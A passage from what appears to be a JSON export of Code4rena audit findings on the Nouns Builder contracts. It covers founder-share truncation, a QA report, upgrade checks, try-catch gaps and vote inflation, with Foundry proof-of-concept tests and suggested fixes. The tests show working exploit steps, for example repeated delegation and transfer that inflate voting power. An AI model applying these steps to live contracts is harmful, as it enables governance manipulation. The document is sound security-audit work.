`uint256` value.  This can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).  ## Proof of Concept To verify this bug I created a foundry test. You can add it to the test folder and run it with `forge test --match-test testFounderGettingAllBaseTokensBug`.  This test deploys a token implementation and an `ERC1967` proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the `totalOwnership` variable is a `uint8`, and when truncating 256 to fit in a `uint8` it will turn to 0, so this check will pass.  After the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn't get any base tokens at all.  What actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.  This happens because `schedule`, which is equal to `100 / founderPct`, will be zero (`100 / 256 == 0` due to uint div operation), and the base token id won't be updated in `(baseTokenId += schedule) % 100` (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the `_getNextTokenId`, where it will be incremented by 1.  This exploit can work as long as the sum of the percents modulo 256 (truncation to `uint8`) is not more than 100.  ```sol // The relative path of this file is \"test/FounderGettingAllBaseTokensBug.t.sol\"  // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { Test } from \"forge-std/Test.sol\";  import { IManager } from \"../src/manager/Manager.sol\"; import { IToken, Token } from \"../src/token/Token.sol\";  import { TokenTypesV1 } from \"../src/token/types/TokenTypesV1.sol\";  import { ERC1967Proxy } from \"../src/lib/proxy/ERC1967Proxy.sol\";  contract FounderGettingAllBaseTokensBug is Test, TokenTypesV1 {      Token imp;     address proxy;          function setUp() public virtual {         // Deploying the implementation and the proxy         imp = new Token(address(this));         proxy = address(new ERC1967Proxy(address(imp), \"\"));     }      function testFounderGettingAllBaseTokensBug() public {          IToken token = IToken(proxy);          address chadFounder = address(0xdeadbeef);         address betaFounder = address(0xBBBBBBBB); // beta          // Creating 2 founders with `ownershipPct = 256`         IManager.FounderParams[] memory founders = new IManager.FounderParams[](2);         founders[0] = IManager.FounderParams({             wallet: chadFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });         founders[1] = IManager.FounderParams({             wallet: betaFounder,             ownershipPct: 256,             vestExpiry: 1 weeks         });          // Initializing the proxy with the founders data         token.initialize(                founders,              // we don't care about these             abi.encode(\"\", \"\", \"\", \"\", \"\"),             address(0),             address(0)         );          // Asserting that the chad founder got all the base token ids         // (`tokenId % 100` is calculated to get the base token, so it is enough to check only the first 100 token ids)         for (uint i; i < 100; ++i) {             assertEq(token.getScheduledRecipient(i).wallet == chadFounder, true);         }          // Run with `forge test --match-test testFounderGettingAllBaseTokensBug`         // Results:         //      [PASS] testFounderGettingAllBaseTokensBug() (gas: 13537465)         // Great success     } ```  ## Tools Used Manual audit & foundry for the PoC  ## Recommended Mitigation Steps Don't truncate the `founderPct` variable to a uint8 when adding it to the totalOwnership variable, or alternatively check that it is less than `type(uint8).max` (or less or equal to 100). After applying this fix and running the test again, the result is: ``` [FAIL. Reason: INVALID_FOUNDER_OWNERSHIP()] testFounderGettingAllBaseTokensBug() (gas: 58674) ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/297", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "- [Low](#low)     - [**1. Outdated compiler**](#1-outdated-compiler)     - [**2. Method marked as payable unnecessarily**](#2-method-marked-as-payable-unnecessarily)     - [**3. Integer overflow by unsafe casting**](#3-integer-overflow-by-unsafe-casting)     - [**4. Lack of checks**](#4-lack-of-checks)     - [**5. Not fully decentralized**](#5-not-fully-decentralized)     - [**6. Unsecure state order**](#6-unsecure-state-order)     - [**7. Timestamp dependence**](#7-timestamp-dependence) - [Non critical](#non-critical)     - [**8. Use abstract for base contracts**](#8-use-abstract-for-base-contracts)     - [**9. Avoid duplicate logic**](#9-avoid-duplicate-logic)     - [**10. Avoid hardcoded values**](#10-avoid-hardcoded-values)     - [**11. Unpredictable change of owner**](#11-unpredictable-change-of-owner)     - [**12. Improve user experience**](#12-improve-user-experience)  # Low  ## **1. Outdated compiler**  The pragma version used are:  ``` pragma solidity ^0.8.15; pragma solidity 0.8.15; pragma solidity ^0.8.4; pragma solidity ^0.8.0; ```  *Note that mixing pragma are not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.*  The minimum required version must be [0.8.16](https://github.com/ethereum/solidity/releases/tag/v0.8.16); otherwise, contracts will be affected by the following **important bug fixes**:  [0.8.3](https://blog.soliditylang.org/2021/03/23/solidity-0.8.3-release-announcement/):  - Optimizer: Fix bug on incorrect caching of Keccak-256 hashes.  [0.8.4](https://blog.soliditylang.org/2021/04/21/solidity-0.8.4-release-announcement/):  - ABI Decoder V2: For two-dimensional arrays and specially crafted data in memory, the result of abi.decode can depend on data elsewhere in memory. Calldata decoding is not affected.  [0.8.9](https://blog.soliditylang.org/2021/09/29/solidity-0.8.9-release-announcement/):  - Immutables: Properly perform sign extension on signed immutables. - User Defined Value Type: Fix storage layout of user defined value types for underlying types shorter than 32 bytes.  [0.8.13](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/): - Code Generator: Correctly encode literals used in `abi.encodeCall` in place of fixed bytes arguments.  [0.8.14](https://blog.soliditylang.org/2022/05/18/solidity-0.8.14-release-announcement/):  - ABI Encoder: When ABI-encoding values from calldata that contain nested arrays, correctly validate the nested array length against `calldatasize()` in all cases. - Override Checker: Allow changing data location for parameters only when overriding external functions.  [0.8.15](https://blog.soliditylang.org/2022/06/15/solidity-0.8.15-release-announcement/)  - Code Generation: Avoid writing dirty bytes to storage when copying `bytes` arrays. - Yul Optimizer: Keep all memory side-effects of inline assembly blocks.  [0.8.16](https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/)  - Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.  Apart from these, there are several minor bug fixes and improvements.  ## **2. Method marked as `payable` unnecessarily**  The following methods have been marked as `payable`, this may cause both administrators and users calling them to accidentally deposit ether with no recovery possible.  This may be done to save gas, but may result in more loss than benefit in case of one human error.  **Affected source code:**  - [Manager.sol:61](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L61) - [ERC1967Proxy.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Proxy.sol#L21) - [MetadataRenderer.sol:32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L32) - [Token.sol:30](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L30) - [Auction.sol:39](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L39) - [Governor.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L41)  ## **3. Integer overflow by unsafe casting**  Keep in mind that the version of solidity used, despite being greater than `0.8`, does not prevent integer overflows during casting, it only does so in mathematical operations.  It is necessary to safely convert between the different numeric types.  **Example:**  A dangerous example is with the `quorum` method.  ```javascript         proposal.quorumVotes = uint32(quorum()); ```  This method depends the token's `totalSupply`, so it could overflow with certains tokens.  ```javascript function quorum() public view returns (uint256) {     unchecked {         return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;     } } ```  **Recommendation:**  Use a [safeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from Open Zeppelin.  **Affected source code:**  - [ERC721Votes.sol:252](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252) - [Token.sol:88](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88) - [Token.sol:98](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L98) - [Token.sol:99](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L99) - [Token.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L123) - [Token.sol:124](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L124) - [Auction.sol:149](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L149) - [Auction.sol:223](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L223) - [Auction.sol:224](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L224) - [Governor.sol:168](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L168) - [Governor.sol:280](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L280) - [Governor.sol:285](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L285) - [Governor.sol:290](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L290)  ## **4. Lack of checks**  The following methods have a lack of checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  **Affected source code for `address(0)`:**  - [Manager.sol:62-66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L62-L66) - [MetadataRenderer.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L33) - [Treasury.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L33) - [Token.sol:31](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L31) - [Token.sol:65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L65) - [Token.sol:66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L66) - [Auction.sol:40](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L40) - [Auction.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L41) - [Auction.sol:79](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L79) - [Governor.sol:42](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L42)  **It wasn't checked `_delay` max value (E.g. more than 1 month...):**  - [Treasury.sol:43](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L43)  ## **5. Not fully decentralized**  The `updateVotingDelay`, `updateVotingPeriod`, `updateProposalThresholdBps`, `updateQuorumThresholdBps`, `updateVetoer`, `burnVetoer` methods in the `Governor` contract have the `onlyOwner` modifier, but to be fully decentralized, these methods must verify that the address is the same as the contract himself to force a proposal to call these methods.  **Affected source code:**  - [Governor.sol:564-609](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L564-L609)  ## **6. Unsecure state order**  Negative states must be processed before positive states, otherwise, a proposal that is `Expired` or `Executed`, but is `Active` or `Pending` will be returned as `Active` or `Pending`, this makes it necessary to check that the state is correct from outside this method. I mean, changing outside the variables that alter this state in the correct way.  ```diff     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;  +           // Else if the proposal can no longer be executed: +       } else if (settings.treasury.isExpired(_proposalId)) { +           return ProposalState.Expired; -           // Else if voting has not ended: -       } else if (block.timestamp < proposal.voteEnd) { -           return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;  +           // Else if voting has not ended: +       } else if (block.timestamp < proposal.voteEnd) { +           return ProposalState.Active;             // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;  -           // Else if the proposal can no longer be executed: -       } else if (settings.treasury.isExpired(_proposalId)) { -           return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  **Affected source code:**  - [Governor.sol:413-456](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L413-L456)  ## **7. Timestamp dependence**  There are three main considerations when using a timestamp to execute a critical function in a contract, especially when actions involve fund transfer.  - Timestamp manipulation   - Be aware that the timestamp of the block can be manipulated by a miner - The 15-second Rule   - The [Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) (Ethereum\u2019s reference specification) does not specify a constraint on how much blocks can drift in time, but [it does specify](https://ethereum.stackexchange.com/a/5926/46821) that each timestamp should be bigger than the timestamp of its parent. Popular Ethereum protocol implementations Geth and Parity both reject blocks with timestamp more than 15 seconds in future. Therefore, a good rule of thumb in evaluating timestamp usage is: if the scale of your time-dependent event can vary by 15 seconds and maintain integrity, it is safe to use a `block.timestamp`. - Avoid using `block.number` as a timestamp   - It is possible to estimate a time delta using the `block.number` property and [average block time](https://etherscan.io/chart/blocktime), however this is not future proof as block times may change (such as [fork reorganisations](https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations) and the [difficulty bomb](https://github.com/ethereum/EIPs/issues/649)). In a sale spanning days, the 15-second rule allows one to achieve a more reliable estimate of time.   See [SWC-116](https://swcregistry.io/docs/SWC-116)  **Reference:**  - https://consensys.net/blog/developers/solidity-best-practices-for-smart-contract-security/  **Affected source code:**  - [Treasury.sol:89](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L89)  ---  # Non critical  ## **8. Use `abstract` for base contracts**  `abstract` contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  **Reference:**  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  **Affected source code:**  - [TokenStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/storage/TokenStorageV1.sol#L9) - [MetadataRendererStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/storage/MetadataRendererStorageV1.sol#L9) - [ManagerStorageV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/storage/ManagerStorageV1.sol#L7) - [TreasuryTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/types/TreasuryTypesV1.sol#L7) - [TreasuryStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/storage/TreasuryStorageV1.sol#L9) - [GovernorStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/storage/GovernorStorageV1.sol#L9) - [AuctionTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/types/AuctionTypesV1.sol#L7) - [AuctionStorageV1.sol:10](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/storage/AuctionStorageV1.sol#L10)  ## **9. Avoid duplicate logic**  Use [Address.toBytes32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/utils/Address.sol#L26) instead of replicate the logic.  **Affected source code:**  - [Manager.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L123) - [Manager.sol:165](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L165)  ## **10. Avoid hardcoded values**  It is not good practice to hardcode values, but if you are dealing with addresses much less, these can change between implementations, networks or projects, so it is convenient to remove these addresses from the source code.  use selectors:  - [ERC721.sol:63-L65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721.sol#L63-L65)  Use `immutable` with the formula, instead of the result:  - [ERC1967Upgrade.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L21) - [ERC1967Upgrade.sol:24](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L24)  ## **11. Unpredictable change of owner**  The `MetadataRenderer.addProperties` method takes advantage when `ipfsData` is not defined to transfer the owner to the treasury, however this logic should be done in an initialization method and not in a configuration one, since the user does not expect this type of change when calling to this type of methods, it is convenient to adapt the logic or mention this behavior in a comment.  **Affected source code:**  - [MetadataRenderer.sol:102](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L102)  ## **12. Improve user experience**  In the `Auction._handleOutgoingTransfer` method, before throwing the `INSOLVENT` error, check if the contract has `WETH`, because maybe it's possible to send `WETH` instead of an throwing an error.  ```javascript     function _handleOutgoingTransfer(address _to, uint256 _amount) private {         // Ensure the contract has enough ETH to transfer         if (address(this).balance < _amount) revert INSOLVENT();          // Used to store if the transfer succeeded         bool success;          assembly {             // Transfer ETH to the recipient             // Limit the call to 50,000 gas             success := call(50000, _to, _amount, 0, 0, 0, 0)         }          // If the transfer failed:         if (!success) {             // Wrap as WETH             IWETH(WETH).deposit{ value: _amount }();              // Transfer WETH instead             IWETH(WETH).transfer(_to, _amount);         }     } ```  **Affected source code:**  - [Auction.sol:346](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L346)  "}, {"title": "Upgrade of Manager.sol inconsistent with interface and other contracts", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/256", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol#L209   # Vulnerability details  ### Impact  [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) implements a different pattern to contract upgradeability only performing an authorisation check and not ensuring that the new Manager implementation has been registered as an upgrade via `isRegisteredUpgrade()`.  The impact is that an upgrade to the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) does not require a two step approval and be registered via `registerUpgrade()` . Additionally there is no notification event that the Manager implementation has been registered for an upgrade i.e. `UpgradeRegistered`.  In this respect the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) contract has a different implementation to other contracts that make up the DAO (e.g. [Token.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L305) and [Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L618)) and doesn\u2019t follow the process described in the [IManager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/IManager.sol) interface, namely that upgrades are registered via `registerUpgrade()`. and therefore emit the `UpgradeRegistered` event for transparency and monitoring/auditing.  ### Proof of Concept  When comparing `_authorizeUpgrade()` in Manager.sol and Token.sol the implementations differ;  ```solidity // Manager.sol function _authorizeUpgrade(address _newImpl) internal override onlyOwner {}  // Token.sol function _authorizeUpgrade(address _newImpl) internal view override {   // Ensure the caller is the shared owner of the token and metadata renderer   if (msg.sender != owner()) revert ONLY_OWNER();    // Ensure the implementation is valid   if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  When the Manager.sol implementation is updated it **will not** check whether a new implementation has been registered. The `upgradeTo()` function in [UUPS.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/proxy/UUPS.sol) will be called checking authorisation and then upgrading the implementation;  ```solidity // UUPS.sol function upgradeTo(address _newImpl) external onlyProxy {     _authorizeUpgrade(_newImpl);     _upgradeToAndCallUUPS(_newImpl, \"\", false); } ```  However unlike Token.sol, Manager.sol performs no checks as to whether the implementation has been registered only checking that the calling entity is the owner.  ### Tools Used  Vim  ### Recommended Remediation Steps  To make Manager.sol consistent with the IManager interface and other contracts in the DAO it should have the same functionality implemented in `_authoriseUpgrade()` (see below);  ```solidity function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {   if (!this.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  As well as this the [NounsBuilderTest.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/test/utils/NounsBuilderTest.sol) should be updated to perform `.registerUpgrade()` before `.upgradeTo()`. For example;  ```solidity // L71 of NounsBuilderTest.sol vm.startPrank(zoraDAO);   manager.registerUpgrade(managerImpl0, address(managerImpl));   manager.upgradeTo(managerImpl);   vm.stopPrank(); } ```  Then all tests can be run and they will pass."}, {"title": "Try-catch block at `Auction._createAuction()` will only catch string errors", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/240", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234   # Vulnerability details   The `_createAuction` function wraps the `token.mint()` call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)  ## Impact In case of an error at the `mint()` function the auction won't be settled till the owner intervenes and pauses the contract.  ## Proof of Concept Here's a test that proves that `catch Error()` doesn't catch custom errors (the test will fail):  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\";  contract ContractTest is Test {     function testErr() public{         Reverter r = new Reverter();         try r.throwCustomError(){          }catch Error(string memory) {          }     } }  contract Reverter{     error  MyErr();      function throwCustomError() public{         revert MyErr();     } }   ```  ## Recommended Mitigation Steps  Remove the `Error` so that it'll catch any kind of revert:  ```diff              // Pause the contract if token minting failed -        } catch Error(string memory) { +        } catch  {              _pause();          }      } ```"}, {"title": "`_transferFrom()` can be used to indefinitely increase voting power.", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## `_transferFrom()` can be used to indefinitely increase voting power. ### Impact It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.  ### Explanation The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)  ### Code POC ```solidity // Insert this test case into Token.t.sol // Run: forge test --match-contract Token -vv  import \"forge-std/console.sol\"; ... function testIncreaseVotePower() public {         deployMock();          address voter1;         address voter2;         uint256 voter1PK;         uint256 voter2PK;          // Voter with 1 NFT voting power         voter1PK = 0xABC;         voter1 = vm.addr(voter1PK);         vm.deal(voter1, 1 ether);         // Second account created by same voter         voter2PK = 0xABD;         voter2 = vm.addr(voter2PK);    // Giving voter1 their 1 NFT         vm.prank(founder);         auction.unpause();         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(2);         vm.warp(auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();          // Start Exploit         console.log(\"Initial Votes\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));                  vm.prank(voter1);         token.delegate(voter2);         console.log(\"After Delegating Votes, voter1 -> delegate(voter2)\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));          vm.prank(voter1);         token.transferFrom(voter1, voter2, 2);          console.log(\"After Token transfer, voter1 -transferFrom()-> voter2\");         console.log(\"voter1 votes: \", token.getVotes(voter1));         console.log(\"voter2 votes: \", token.getVotes(voter2));          vm.prank(voter2);         token.delegate(voter2);         console.log(\"After Delegating Votes, voter2 -> delegate(voter2)\");         console.log(\"voter1: \", token.getVotes(voter1));         console.log(\"voter2: \", token.getVotes(voter2));     } ``` Expected Output: ```solidity [PASS] testVoteDoublePower() (gas: 3544946) Logs:   Initial Votes   voter1:  1   voter2:  0   After Delegating Votes, voter1 -> delegate(voter2)      voter1:  1   voter2:  1   After Token transfer, voter1 -transferFrom()-> voter2   voter1 votes:  0   voter2 votes:  2   After Delegating Votes, voter2 -> delegate(voter2)      voter1:  0   voter2:  3 ``` ### Recommendations Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states: ``` * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of * the votes in governance decisions, or they can delegate to themselves to be their own representative. ``` The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated. - I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268) ```solidity // Transfer 1 vote from the sender to the recipient \u00a0 \u00a0 \u00a0 \u00a0 _moveDelegateVotes(_from, _to, 1); ``` Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx: ```solidity \u00a0_moveDelegateVotes(delegation[_from], delegation[_to], 1); ``` "}, {"title": "Delegation should not be allowed to address(0)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ## Impact Assuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled \"Delegating votes leaves the token owner with votes while giving the delegate additional votes\"): if a user delegates to address(0) that vote gets lost.  ## Proof of Concept  Assuming the `_delegate` function gets patched by changing: `address prevDelegate = delegation[_from];` to `address prevDelegate = delegates(_from);`  The steps to be taken:  1. User (U) gets one NFT (e.g by winning the auction)  a. votes(U) = 1 2. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 0, votes(address(0)) = 0 3. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 2^192 - 1  Below is a forge test showing the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\"; import { TokenTypesV1 } from \"../../src/token/types/TokenTypesV1.sol\";  contract TokenTest is NounsBuilderTest, TokenTypesV1 {     address user1 = address(0x1001);     address delegate1 = address(0x2001);     address delegate2 = address(0x2002);      function setUp() public virtual override {         